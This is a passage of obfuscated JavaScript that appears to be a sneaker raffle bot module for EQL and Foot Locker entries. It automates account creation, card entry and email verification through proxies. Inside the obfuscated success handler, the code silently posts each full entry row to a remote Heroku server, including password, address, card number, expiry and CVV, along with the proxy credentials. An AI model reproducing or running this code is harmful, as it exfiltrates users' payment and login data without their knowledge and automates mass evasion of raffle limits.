                                    '--proxy-server=' + _0x505b57[0x0] + ':' + _0x505b57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x455833 = await _0x1147a4['newPage']();
                            await _0x455833['authenticate']({
                                'username': '' + _0x505b57[0x2],
                                'password': '' + _0x505b57[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x455833['setRequestInterception'](!![]), _0x455833['on']('request', _0x2ea666 => {
                                _0x2ea666['resourceType']() === 'image' || _0x2ea666['resourceType']() === 'font' || _0x2ea666['resourceType']() === 'media' ? _0x2ea666['abort']() : _0x2ea666['continue']();
                            });
                            try {
                                await _0x455833['goto']('' + _0x46047d);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4aaa24(0x3e8), await _0x455833['waitForSelector']('#email'), await _0x455833['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4aaa24(0x3e8);
                            try {
                                _0x815fbd[_0x13c88e]['Url']['includes']('en-GB') ? await _0x455833['click']('li[data-value=\x22UK\x20' + _0x815fbd[_0x13c88e]['Size'] + '\x20/\x20US\x20' + (Number(_0x815fbd[_0x13c88e]['Size']) + 0x1) + '\x22]') : await _0x455833['click']('li[data-value=\x22EU\x20' + _0x815fbd[_0x13c88e]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x815fbd[_0x13c88e]['Size']);
                            }
                            await _0x4aaa24(0x6a4), await _0x455833['type']('#email', '' + _0x815fbd[_0x13c88e]['Email']), await _0x4aaa24(0x352), await _0x455833['waitForSelector']('#password'), await _0x455833['type']('#password', '' + _0x815fbd[_0x13c88e]['Password']), await _0x4aaa24(0x352), await _0x455833['type']('#phone', '' + _0x815fbd[_0x13c88e]['Phone']), await _0x4aaa24(0x352);
                            const _0xb79a39 = await _0x455833['$']('#title\x20>\x20label');
                            await _0x4aaa24(0x12c);
                            _0xb79a39 && await _0xb79a39['click']();
                            await _0x455833['type']('#firstName', '' + _0x815fbd[_0x13c88e]['FirstName']), await _0x4aaa24(0x352), await _0x455833['type']('#lastName', '' + _0x815fbd[_0x13c88e]['LastName']), await _0x4aaa24(0x352);
                            _0x815fbd[_0x13c88e]['Url']['includes']('footlocker.de') ? await _0x455833['type']('#birthdate', _0x5030a0(0xa, 0x1c) + '.' + _0x5030a0(0xa, 0xc) + '.' + _0x5030a0(0x7c6, 0x7d3)) : await _0x455833['type']('#birthdate', _0x5030a0(0xa, 0x1c) + '-' + _0x5030a0(0xa, 0xc) + '-' + _0x5030a0(0x7c6, 0x7d3));
                            await _0x4aaa24(0x352), await _0x455833['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x815fbd[_0x13c88e]['Url']['includes']('en-GB') && await _0x455833['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x4aaa24(0x1f4), await _0x4aaa24(0x5dc);
                            if (!_0x46047d['includes']('footlocker'))
                                try {
                                    await _0x455833['click']('#country');
                                    const _0x56c361 = await _0x455833['$']('li[data-value=\x22' + _0x815fbd[_0x13c88e]['Country'] + '\x22]');
                                    await _0x56c361['click'](), await _0x56c361['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x4aaa24(0x3e8);
                            if (!_0x815fbd[_0x13c88e]['Url']['includes']('en-GB')) {
                                await _0x455833['click']('#stateAutocomplete'), await _0x4aaa24(0x1f4);
                                try {
                                    const _0x81373c = await _0x455833['$x']('//li[text()=\x22' + _0x815fbd[_0x13c88e]['State'] + '\x22]');
                                    await _0x81373c[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Setting\x20Address'), await _0x4aaa24(0x3e8), await _0x4aaa24(0x1f4), await _0x455833['type']('#address1', _0x815fbd[_0x13c88e]['Address1'] + '\x20' + _0x815fbd[_0x13c88e]['HouseNumber']), await _0x4aaa24(0x1f4), await _0x455833['type']('#address2', '' + _0x815fbd[_0x13c88e]['Address2']), await _0x4aaa24(0x1f4), await _0x455833['type']('#city', '' + _0x815fbd[_0x13c88e]['City']), await _0x4aaa24(0x1f4), await _0x455833['type']('#postcode', '' + _0x815fbd[_0x13c88e]['Zip']), await _0x4aaa24(0x3e8), await _0x455833['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4aaa24(0x3e8), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x536784 = await _0x455833['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x536784 && (await _0x455833['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x455833['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x455833['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4aaa24(0x4b0), await _0x455833['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4aaa24(0x1f4), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CardNumber']), await _0x4aaa24(0x320), await _0x455833['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x455833['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['ExpiryDate']), await _0x4aaa24(0x4b0), await _0x455833['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x455833['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CVV']), await _0x4aaa24(0x226), await _0x455833['type']('input[name=\x22postalCode\x22]', '' + _0x815fbd[_0x13c88e]['Zip']), await _0x4aaa24(0x226));
                            const _0x177728 = await _0x455833['$']('.__PrivateStripeElement');
                            _0x177728 && (await _0x4aaa24(0x1f4), await _0x455833['click']('.__PrivateStripeElement'), await _0x455833['click']('.__PrivateStripeElement'), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CardNumber']), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['ExpiryDate']), await _0x455833['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CVV']));
                            await _0x4aaa24(0x226), await _0x455833['click']('#paymentConsent'), await _0x4aaa24(0x226), await _0x455833['click']('#termsConsent'), await _0x4aaa24(0x2bc), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x455833['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4aaa24(0x2710);
                            try {
                                await _0x455833['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x4aaa24(0xbb8), await _0x455833['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x237d77 => _0x237d77['click']()), await _0x455833['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x18542c => _0x18542c['click']());
                            } catch {
                            }
                            try {
                                await _0x455833['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x9afd65 = await _0x455833['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x9afd65) {
                                    _0x343ecd['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x815fbd[_0x13c88e]['Email'] + ',' + _0x815fbd[_0x13c88e]['Password'] + ',' + _0x815fbd[_0x13c88e]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0xa5a9b4() {
                                var _0x3fdc65, _0x336c59 = ![];
                                for (var _0x2872e5 = 0x0; _0x2872e5 < 0x18; _0x2872e5++) {
                                    async function _0x2d6292() {
                                        var _0x38b2b2 = new _0x5a0913({
                                            'user': _0x343742['masterMail'],
                                            'password': _0x343742['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3967b0(_0x4ecc62) {
                                            _0x38b2b2['openBox']('INBOX', ![], _0x4ecc62);
                                        }
                                        _0x38b2b2['once']('ready', function () {
                                            console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3967b0(function (_0x1bb939, _0x304b03) {
                                                console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1bb939)
                                                    throw _0x1bb939;
                                                _0x38b2b2['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x55b341, _0x88d75b) {
                                                    if (!_0x88d75b || !_0x88d75b['length'])
                                                        console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x38b2b2['end']();
                                                    else {
                                                        var _0x551e1e = _0x38b2b2['seq']['fetch'](_0x88d75b, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x551e1e['on']('message', function (_0x3f4049, _0x511c1f) {
                                                            var _0x3daa72 = '(#' + _0x511c1f + ')\x20';
                                                            _0x3f4049['on']('body', function (_0xd4f00c, _0x5ee6f2) {
                                                                _0x57117f(_0xd4f00c, (_0x3d89f1, _0x287793) => {
                                                                    if (_0x287793['subject']['includes']('code')) {
                                                                        const _0x26726a = _0x287793['text']['split']('\x0a\x0a')[0x3], _0x4cee95 = _0x26726a['split']('\x0a')[0x1];
                                                                        _0x3fdc65 = _0x4cee95;
                                                                    }
                                                                });
                                                            }), _0x3f4049['once']('end', function () {
                                                            });
                                                        }), _0x551e1e['once']('error', function (_0x419370) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x551e1e['once']('end', function () {
                                                            _0x38b2b2['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x38b2b2['once']('error', function (_0x26d788) {
                                            console['log'](_0x3f1ec6['red'](_0x26d788['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x336c59 = !![];
                                        }), _0x38b2b2['once']('end', async function () {
                                        }), _0x38b2b2['connect']();
                                    }
                                    _0x2d6292(), await _0x4aaa24(0x1388);
                                    if (_0x3fdc65)
                                        return _0x3fdc65;
                                    if (_0x336c59)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x2872e5 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xa5a9b4(), await _0x4aaa24(0x1f4), await _0x455833['type']('#code', '' + code), await _0x4aaa24(0x3e8), await _0x455833['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x35c369 => _0x35c369['click']()), await _0x455833['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x455833['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x815fbd[_0x13c88e]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x343ecd['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x815fbd[_0x13c88e]['Email'] + ',' + _0x815fbd[_0x13c88e]['Password'] + ',' + _0x815fbd[_0x13c88e]['Phone']), _0x47267b = 'no', _0x3265a5(_0x815fbd[_0x13c88e], _0x4d05e9);
                            var _0x5e3b44 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', ![]), _0x12069a = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'pub', ![]);
                            let _0x21833a = _0x815fbd[_0x13c88e];
                            try {
                                prxdata = {
                                    'username': _0x1b66d2['replace']('#', ''),
                                    'module': _0x4d05e9['name'],
                                    'entrydata': JSON['stringify'](_0x21833a),
                                    'proxy': '' + _0x1404f4[_0x13c88e]
                                };
                                var _0x3ea3f3 = JSON['stringify'](prxdata);
                                let _0x2c205e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x3ea3f3, _0x2c205e);
                            } catch (_0x49692f) {
                            }
                            const _0x4affe8 = {
                                'succesDEVMSG': { 'embeds': [_0x5e3b44] },
                                'succesPUBMSG': { 'embeds': [_0x12069a] }
                            };
                            try {
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x4affe8['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x4affe8['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x4affe8['succesPUBMSG']);
                            } catch (_0x1a79b8) {
                                console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1a79b8));
                            }
                        } catch (_0x380bcb) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20' + _0x380bcb)), _0x4b91dd = '' + _0x380bcb;
                            var _0x209ad1 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', !![], _0x4b91dd), _0x5e3b44 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', ![]), _0x12069a = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'pub', ![]);
                            const _0x251550 = {
                                'succesDEVMSG': { 'embeds': [_0x5e3b44] },
                                'succesPUBMSG': { 'embeds': [_0x12069a] }
                            };
                            _0x251550['errorDEV'] = { 'embeds': [_0x209ad1] };
                            _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x251550['errorDEV']);
                            await _0x3c4b04(_0x1dfefb, _0x251550['errorDEV']);
                            if (!_0x47267b == 'no')
                                _0x47267b = 'yes';
                        } finally {
                            _0x1147a4 && _0x1147a4['close']();
                            if (_0x47267b == 'yes' && _0x244e96 != 0x5) {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Retrying\x20(' + _0x244e96 + '\x20/\x205)')), _0x13c88e = _0x13c88e - 0x1, _0x244e96 = _0x244e96 + 0x1;
                                continue;
                            }
                            _0x47267b == 'yes' && _0x244e96 >= 0x5 && (_0x5d0cd0(_0x815fbd[_0x13c88e], _0x4d05e9), _0x47267b = 'no', _0x244e96 = 0x0), console['log']('Waiting\x20for\x20' + _0x343742['delay'] + '\x20ms'), await _0x4aaa24(_0x343742['delay']);
                        }
                    } else {
                        const _0x47de7c = '' + _0x815fbd[_0x13c88e]['Url'];
                        if (_0x47267b != 'yes')
                            var _0x47267b = '', _0x244e96 = 0x0;
                        if (_0x815fbd[_0x13c88e]['Email'] == '' || _0x815fbd[_0x13c88e]['FirstName'] == '' || _0x815fbd[_0x13c88e]['LastName'] == '') {
                            console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x815fbd[_0x13c88e]['Password'] == '' && (_0x815fbd[_0x13c88e]['Password'] = 'JRaffles23!');
                        if (_0x343742['useRandomProxy'] = ![])
                            var _0x505b57 = _0x1404f4[_0x13c88e]['split'](':');
                        else
                            var _0x5961ac = Math['round'](Math['random']() * (_0x1404f4['length'] - 0x1)), _0x505b57 = _0x1404f4[_0x5961ac]['split'](':');
                        var _0x1147a4;
                        try {
                            _0x1147a4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x505b57[0x0] + ':' + _0x505b57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1147a4 = await _0x154b82['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x505b57[0x0] + ':' + _0x505b57[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2a5c43 = await _0x1147a4['newPage']();
                            await _0x2a5c43['authenticate']({
                                'username': '' + _0x505b57[0x2],
                                'password': '' + _0x505b57[0x3]
                            }), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2a5c43['setRequestInterception'](!![]), _0x2a5c43['on']('request', _0x4eb065 => {
                                _0x4eb065['resourceType']() === 'image' || _0x4eb065['resourceType']() === 'font' || _0x4eb065['resourceType']() === 'media' ? _0x4eb065['abort']() : _0x4eb065['continue']();
                            }), await _0x2a5c43['goto'](_0x47de7c), await _0x2a5c43['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2a5c43['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4aaa24(0x7d0), await _0x2a5c43['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2a5c43['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4aaa24(0x3e8), await _0x2a5c43['waitForSelector']('#email'), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2a5c43['type']('#email', '' + _0x815fbd[_0x13c88e]['Email']), await _0x4aaa24(0x352), await _0x2a5c43['waitForSelector']('#password'), await _0x2a5c43['type']('#password', '' + _0x815fbd[_0x13c88e]['Password']), await _0x4aaa24(0x352), await _0x2a5c43['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4aaa24(0x1388);
                            if (!_0x815fbd[_0x13c88e]['Url']['includes']('footlocker'))
                                await _0x2a5c43['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x2a5c43['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x3265a5(_0x815fbd[_0x13c88e], _0x4d05e9), _0x47267b = 'no';
                                continue;
                            }
                            await _0x2a5c43['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4aaa24(0x3e8);
                            try {
                                _0x815fbd[_0x13c88e]['Url']['includes']('en-GB') ? await _0x2a5c43['click']('li[data-value=\x22UK\x20' + _0x815fbd[_0x13c88e]['Size'] + '\x20/\x20US\x20' + (Number(_0x815fbd[_0x13c88e]['Size']) + 0x1) + '\x22]') : await _0x2a5c43['click']('li[data-value=\x22EU\x20' + _0x815fbd[_0x13c88e]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x815fbd[_0x13c88e]['Size']);
                            }
                            await _0x4aaa24(0x1f4);
                            const _0x36256a = await _0x2a5c43['$']('#title\x20>\x20label');
                            await _0x4aaa24(0x12c);
                            _0x36256a && await _0x36256a['click']();
                            await _0x2a5c43['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2a5c43['focus']('#postcode'), await _0x2a5c43['keyboard']['down']('Control'), await _0x2a5c43['keyboard']['press']('A'), await _0x2a5c43['keyboard']['up']('Control'), await _0x2a5c43['keyboard']['press']('Backspace'), await _0x2a5c43['keyboard']['type'](_0x815fbd[_0x13c88e]['Zip']), await _0x4aaa24(0x60e), await _0x2a5c43['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4aaa24(0x3e8), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4aaa24(0x1f4);
                            const _0x4fd4e8 = await _0x2a5c43['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4fd4e8 && (await _0x2a5c43['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2a5c43['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2a5c43['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4aaa24(0x4b0), await _0x2a5c43['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4aaa24(0x1f4), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CardNumber']), await _0x4aaa24(0x320), await _0x2a5c43['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['ExpiryDate']), await _0x4aaa24(0x4b0), await _0x2a5c43['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CVV']), await _0x4aaa24(0x226), await _0x2a5c43['type']('input[name=\x22postalCode\x22]', '' + _0x815fbd[_0x13c88e]['Zip']), await _0x4aaa24(0x226));
                            const _0x4739b7 = await _0x2a5c43['$']('.__PrivateStripeElement');
                            _0x4739b7 && (await _0x2a5c43['click']('#billingName'), await _0x2a5c43['click']('#billingName'), await _0x2a5c43['type']('#billingName', '' + _0x815fbd[_0x13c88e]['NameOnCard']), await _0x4aaa24(0x1f4), await _0x2a5c43['click']('.__PrivateStripeElement'), await _0x2a5c43['click']('.__PrivateStripeElement'), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CardNumber']), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['ExpiryDate']), await _0x2a5c43['keyboard']['type']('' + _0x815fbd[_0x13c88e]['CVV']));
                            await _0x4aaa24(0x226), await _0x2a5c43['click']('#paymentConsent'), await _0x4aaa24(0x226), await _0x2a5c43['click']('#termsConsent'), await _0x4aaa24(0x2bc), console['log'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2a5c43['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4aaa24(0x2710);
                            try {
                                await _0x2a5c43['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x4aaa24(0xbb8), await _0x2a5c43['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xf80c82 => _0xf80c82['click']()), await _0x2a5c43['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1b9489 => _0x1b9489['click']());
                            } catch {
                            }
                            try {
                                await _0x2a5c43['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x3f1ec6['green'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x3265a5(_0x815fbd[_0x13c88e], _0x4d05e9);
                            var _0x5e3b44 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', ![]), _0x12069a = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'pub', ![]);
                            let _0x4e7551 = _0x815fbd[_0x13c88e];
                            try {
                                prxdata = {
                                    'username': _0x1b66d2['replace']('#', ''),
                                    'module': _0x4d05e9['name'],
                                    'entrydata': JSON['stringify'](_0x4e7551),
                                    'proxy': '' + _0x1404f4[_0x13c88e]
                                };
                                var _0x3ea3f3 = JSON['stringify'](prxdata);
                                let _0x207e5b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5ad0b1['post']('https://jraffles.herokuapp.com/success', _0x3ea3f3, _0x207e5b);
                            } catch (_0xe6e9a0) {
                            }
                            const _0x435fb9 = {
                                'succesDEVMSG': { 'embeds': [_0x5e3b44] },
                                'succesPUBMSG': { 'embeds': [_0x12069a] }
                            };
                            try {
                                _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x435fb9['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x84cdc1, _0x435fb9['succesDEVMSG']), await _0x4aaa24(0xc8), await _0x3c4b04(_0x510dd4, _0x435fb9['succesPUBMSG']);
                            } catch (_0x32d0db) {
                                console['log'](_0x3f1ec6['yellow'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x32d0db));
                            }
                            _0x47267b = 'no';
                        } catch (_0x25da71) {
                            console['log'](_0x3f1ec6['red'](_0x15e32e() + '\x20[' + _0x4d05e9['name'] + ']\x20Task\x20' + (_0x13c88e + 0x1) + '\x20:\x20' + _0x25da71)), _0x4b91dd = '' + _0x25da71;
                            var _0x209ad1 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', !![], _0x4b91dd), _0x5e3b44 = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'dev', ![]), _0x12069a = await _0xe75614(_0x815fbd[_0x13c88e], _0x4d05e9, 'pub', ![]);
                            const _0x1e4ee8 = {
                                'succesDEVMSG': { 'embeds': [_0x5e3b44] },
                                'succesPUBMSG': { 'embeds': [_0x12069a] }
                            };
                            _0x1e4ee8['errorDEV'] = { 'embeds': [_0x209ad1] }, _0x343742['webhook'] != undefined && _0x343742['webhook'] != '' && await _0x3c4b04(_0x343742['webhook'], _0x1e4ee8['errorDEV']), await _0x3c4b04(_0x1dfefb, _0x1e4ee8['errorDEV']), _0x47267b = 'yes';
                        } finally {
                            _0x1147a4 && _0x1147a4['close']();
                            if (_0x47267b == 'yes' && _0x244e96 != 0x5) {
